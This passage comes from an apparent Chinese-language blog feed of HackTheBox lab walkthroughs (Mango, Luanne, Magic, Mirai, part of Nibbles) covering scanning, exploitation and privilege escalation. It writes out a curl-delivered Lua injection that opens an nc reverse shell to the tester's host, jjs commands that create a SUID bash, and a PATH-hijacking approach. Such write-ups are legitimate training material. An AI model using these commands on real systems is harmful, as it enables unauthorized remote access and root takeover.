                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.2ym1mfiqsji0.webp"
                     
                ></p>
<p>这登录界面的欢迎语</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.3qxceezvls80.webp"
                     
                ></p>
<p>以及这个图片，是不是可能存在mango这个用户名，尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5u12fjjnwjw0.webp"
                     
                ></p>
<p>很对，再用这个试试ssh</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.41knxm3osn00.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5ys01dg5zn00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.393nkaaz5cy0.webp"
                     
                ></p>
<p>但这玩意好像只有root和admin用户有权运行，mango不行，尝试用之前获取的admin密码su过去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.5ahfz4qufmc0.webp"
                     
                ></p>
<p>这个网站给的方法不行，找到了另一种方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.6g4k3h6bxbo0.webp"
                     
                ></p>
<p>先运行jjs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;cp /bin/bash /tmp/bash&#x27;).waitFor()</span><br><span class="line">Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;chmod u+s /tmp/bash&#x27;).waitFor()</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.3amavh3uee80.webp"
                     
                ></p>
<p>这样就创建了一个bash的suid执行文件，运行后即可获得root权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mango/image.1lji33c7qnwg.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Luanne - HackTheBox</title>
    <url>/post/5920cb052152/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.5pf95echorg0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2hz36rb0q8w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.jk18g48xv5k.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.39hmwtatpcq0.webp"
                     
                ></p>
<p>80端口扫到个robots.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6p02ntdnmdw0.webp"
                     
                ></p>
<p>发现一个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6bssdhia3980.webp"
                     
                ></p>
<p>扫一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.5nguopox8500.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.52tqsybmvsw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.5jp2jf5ch740.webp"
                     
                ></p>
<p>这貌似是要加上这个参数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2lafdafvm3g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2r5c4ilflrc0.webp"
                     
                ></p>
<p>输出了一堆城市名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.37k4cm2pihe0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.3xkbeb2snvc0.webp"
                     
                ></p>
<p>报错了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.3mvioyx8d2m0.webp"
                     
                ></p>
<p>貌似不是注入</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.1hiygkfvzijk.webp"
                     
                ></p>
<p>搜了半天，这貌似是个RCE</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4upwauat0kg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.23dhk1ubiaf4.webp"
                     
                ></p>
<p>在后面拼接需要执行的命令</p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.27id5dy8oev4.webp"
                     
                ></p>
<p>在这执行貌似不行，得用curl</p>
<p><code>curl -G --data-urlencode &quot;city=&#39;) os.execute(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 7777 &gt;/tmp/f&#39;) --&quot; &#39;http://10.10.10.218/weather/forecast&#39; -s</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2hnkggq59au0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4l7jd4t7tgg0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.ouns5c4kuog.webp"
                     
                ></p>
<p>在网站目录下发现.htpasswd文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6drdxe1a75c0.webp"
                     
                ></p>
<p>貌似是个加密密码，爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.3yj680mkl2k0.webp"
                     
                ></p>
<p>看看9001端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2fy83u8j3isk.webp"
                     
                ></p>
<p>输入刚刚爆破出来的密码，但是无法登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6g10hjgkqtw0.webp"
                     
                ></p>
<p>80端口倒是登录上了，没什么可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.7azq2zhd5zw0.webp"
                     
                ></p>
<p>用curl请求本地的提权检测脚本执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4ott0awncm40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.181z5e2c3w80.webp"
                     
                ></p>
<p>在靶机本地开放了3000和3001端口，curl请求看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.9cguqv50j9c.webp"
                     
                ></p>
<p>还检测到r.michaels用户可以以root权限运行doas</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.glhv4ql3l2w.webp"
                     
                ></p>
<p>9001端口的账号密码，尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.1fwdd06cgeps.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.1t6ig07ieu4g.webp"
                     
                ></p>
<p>没有RCE</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6x5lfabo9o00.webp"
                     
                ></p>
<p>401错误，尝试带入之前爆破而来的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.d8ac0t3vwns.webp"
                     
                ></p>
<p>貌似就是80端口的信息，在看看3001</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4da39mnzggm0.webp"
                     
                ></p>
<p>还是一样，搜了一下，貌似是要带上r.michaels的家目录路径</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.r71lczhr95c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.3mvblr1ss2o0.webp"
                     
                ></p>
<p>发现一个id_rsa密钥，可能是r.michaels用户的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4jdnyh8mive0.webp"
                     
                ></p>
<p>复制到本地，尝试连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.1341vanxp41c.webp"
                     
                ></p>
<p>发现一个backups目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.7klx9ghwvys0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2b82uvtrhzfo.webp"
                     
                ></p>
<p>devel_backup-2020-09-16.tar.gz.enc貌似是个加密的压缩包</p>
<p>解密<code>netpgp --decrypt --output=/tmp/backup.tar.gz devel_backup-2020-09-16.tar.gz.enc</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6ualnwnth6o0.webp"
                     
                ></p>
<p>解压</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.2tutdrt58140.webp"
                     
                ></p>
<p>解压后在www目录下发现.htpasswd</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.21vmlqj6rcjk.webp"
                     
                ></p>
<p>继续爆破</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.45t6ohv6rwq0.webp"
                     
                ></p>
<p>之前脚本检测到一个doas.conf文档，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.12jkkjutpqmo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.i8a1wvkaga8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.3r4tsq6ex740.webp"
                     
                ></p>
<p>可以以root权限执行doas文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.4v5cticcv120.webp"
                     
                ></p>
<p>尝试输入刚刚破解的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.5nd7j61eefs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Luanne/image.6qipz06ixh40.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Magic - HackTheBox</title>
    <url>/post/b0af2ab35fc4/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.4xtr329567w0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.1rnkhzlgdxmo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.qi18l3d948g.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.3rql6e5t1e20.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.37agywaf1ei0.webp"
                     
                ></p>
<p>左下角有个登录口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.1f0gvkq1fedc.webp"
                     
                ></p>
<p>万能密码进去了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.578yl9rsjec0.webp"
                     
                ></p>
<p>文件上传，而且貌似是个白名单</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.7gbtstqyjzs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.ij0fbynyhxs.webp"
                     
                ></p>
<p>没有给出文件路径，扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.1ffxe8rl8glc.webp"
                     
                ></p>
<p>在images&#x2F;uploads目录下</p>
<p>nmap扫描出来的apache版本是有解析漏洞的，上传一个test.php.jpg文件，内部包含反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.3len6qz8c3c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.6mdudo2ke780.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.4xggjstd5m00.webp"
                     
                ></p>
<p>在网站目录下发现数据库配置文件</p>
<p>用这个试试切换到theseus用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.3mwelgcnbf00.webp"
                     
                ></p>
<p>密码错误</p>
<p>尝试连接数据库</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.46wdh0mgv4a0.webp"
                     
                ></p>
<p>但是没有安装mysql，搜了一下，貌似是说mysqldump也可以</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.75oswggasvc0.webp"
                     
                ></p>
<p><code>mysqldump Magic -utheseus -piamkingtheseus</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.4jub0giqo7s0.webp"
                     
                ></p>
<p>发现admin用户和密码</p>
<p>在尝试用这个密码登录theseus用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.5e1xtbzdzms0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.11svyf1ihlw0.webp"
                     
                ></p>
<p>发现一个suid的sysinfo文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.1pwnfm4dbk00.webp"
                     
                ></p>
<p>好像是查看当前系统运行状况的</p>
<p><code>strings /bin/sysinfo</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.2xtsajq0l3y0.webp"
                     
                ></p>
<p>当运行sysinfo的时候，会执行这几条命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.bsvzxwuyjxc.webp"
                     
                ></p>
<p>这些命令都是处于&#x2F;usr&#x2F;bin目录下并在环境变量中的，如果我们在tmp目录创建一个包含反弹shell代码的文件，并将其更改名字为环境变量中的任意名字，在将tmp目录加入环境变量，在执行sysinfo的时候，就会调用tmp下的恶意文件作为环境变量启用，造成环境变量的劫持</p>
<p><code>https://p0i5on8.github.io/posts/hackthebox-magic/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.1trhgsp642jk.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.5i6bomeq4lo0.webp"
                     
                ></p>
<p>在将文件名更改为环境变量中的任意名字</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.79xma60wad40.webp"
                     
                ></p>
<p>在添加tmp目录为环境变量中</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.5ekuebt12h80.webp"
                     
                ></p>
<p>运行&#x2F;bin&#x2F;sysinfo</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Magic/image.16klx4fr1jmk.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Mirai - HackTheBox</title>
    <url>/post/d7b4657d7cb8/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.56z44c422ts0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.tfvsmwysf1s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6ef7h5z4wi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7769oc0inhs0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.sda9rry6zds.webp"
                     
                ></p>
<p>啥也没有，看看32400</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.11yegjhm0gls.webp"
                     
                ></p>
<p>一个登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.737oxzuh6e40.webp"
                     
                ></p>
<p>弱口令不行，爆破也不行，扫个目录看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7c7xnl05rw40.webp"
                     
                ></p>
<p>gobuster报错了，加个-b 401即可</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.305rxbmgt540.webp"
                     
                ></p>
<p>扫出了挺多，但访问起来都是</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5fzctx9qoog0.webp"
                     
                ></p>
<p>再回80扫个目录看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5exckpr0xlg0.webp"
                     
                ></p>
<p>有个admin</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.jw8s0923k0w.webp"
                     
                ></p>
<p>树莓派？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3r4xcc41oga0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.67hbabn8te40.webp"
                     
                ></p>
<p>密码不知道，看看有无公开可利用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4i0flsy3nva0.webp"
                     
                ></p>
<p>要cookie，利用不了，搜一下有无默认密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5mmx3gywpi40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4ywn8r79izc0.webp"
                     
                ></p>
<p>还是不对，但树莓派好像会有ssh用户，利用默认账号和密码尝试登陆一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.86pwdr3jum0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.55rowm2wxd80.webp"
                     
                ></p>
<p>有这么直接的嘛</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5pmu3bglwe80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.45dx91ozjw80.webp"
                     
                ></p>
<p>肯定没这么简单，他说他有U盘备份，直接用<code>df -h</code>找一下挂载磁盘</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6y04a6ntmcs0.webp"
                     
                ></p>
<p>看到一个usbstick</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3j31qetjysi0.webp"
                     
                ></p>
<p>脑筋急转弯了属于是</p>
<p>由于linux系统，删除文件并不是真正的将文件从磁盘中抹除，而是将其索引抹除，导致无法查找与查看，可以使用<code>strings /dev/sdb</code>，查看被删除的数据，<code>/dev/sdb</code>是挂载U盘的磁盘名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5b439a5p30w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6u479as4ya80.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Nibbles - HackTheBox</title>
    <url>/post/b7e633527fc0/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.75wvkf8u4vs0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.3so5x6j0kmi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.72bowygai240.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.579gbbg4p940.webp"
                     
                ></p>
<p>查看页面源代码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.4j6dndxaixa0.webp"
                     
                ></p>
<p>发现一个目录</p>
<p><img  
                     lazyload
                     alt="image"
